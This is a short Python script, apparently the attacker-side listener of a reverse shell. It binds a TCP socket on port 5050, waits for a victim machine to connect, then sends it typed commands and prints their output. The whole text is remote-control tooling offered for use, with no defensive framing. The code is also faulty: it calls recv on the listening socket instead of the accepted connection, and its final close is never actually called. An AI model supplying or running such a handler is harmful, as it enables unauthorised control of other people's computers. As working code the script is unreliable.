from socket import *

server = "0.0.0.0"
port = 5050
ADDR = (server,port)

s = socket(AF_INET, SOCK_STREAM)
s.bind((ADDR))
s.listen(5)

print("[+] server is running... ")

c, adr = s.accept()

while True:

    shell = input(s.recv(1024).decode('utf-8'))
    c.send(shell.encode('utf-8'))
    data = c.recv(102343)
    print(data)

c.close